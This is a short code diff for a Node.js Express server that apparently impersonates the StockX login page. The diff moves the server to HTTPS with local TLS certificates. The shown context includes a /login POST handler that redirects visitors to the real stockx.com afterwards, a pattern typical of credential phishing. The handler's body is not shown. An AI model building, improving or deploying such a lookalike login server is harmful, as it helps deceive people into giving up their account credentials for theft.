@@ -1,10 +1,17 @@
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
+const https = require('https');
 const bodyParser = require('body-parser');
 
 const app = express();
-const PORT = 3000; // Standard unprivileged port
+const PORT = 8443; // HTTPS port
+
+// Load TLS credentials
+const httpsOptions = {
+  key: fs.readFileSync('localhost.key'),
+  cert: fs.readFileSync('localhost.crt')
+};
 
 // Middleware
 app.use(bodyParser.urlencoded({ extended: false }));
@@ -18,7 +25,7 @@ app.post('/login', (req, res) => {
   res.redirect('https://stockx.com'); // Redirect to real site
 });
 
-// Start HTTP server
-app.listen(PORT, () => {
-  console.log(`🚀 HTTP server running at http://localhost:${PORT}`);
+// Create HTTPS server
+https.createServer(httpsOptions, app).listen(PORT, () => {
+  console.log(`🔒 HTTPS server running at https://localhost:${PORT}`);
 });
